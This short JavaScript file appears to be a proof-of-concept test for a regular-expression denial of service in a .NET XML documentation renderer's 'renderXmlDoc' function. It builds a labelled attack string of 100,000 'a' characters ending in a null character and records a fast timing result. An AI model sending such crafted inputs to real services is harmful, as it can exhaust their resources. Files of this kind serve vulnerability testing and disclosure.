const { renderXmlDoc } = require("./dotnetXmlDocumentation.js");

//Attack String :""+"a"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "\u0000";

const node = {
  text: str,
  type: "note",
};
var result = renderXmlDoc([node]);

// real    0m0.123s
// user    0m0.086s
// sys     0m0.010s
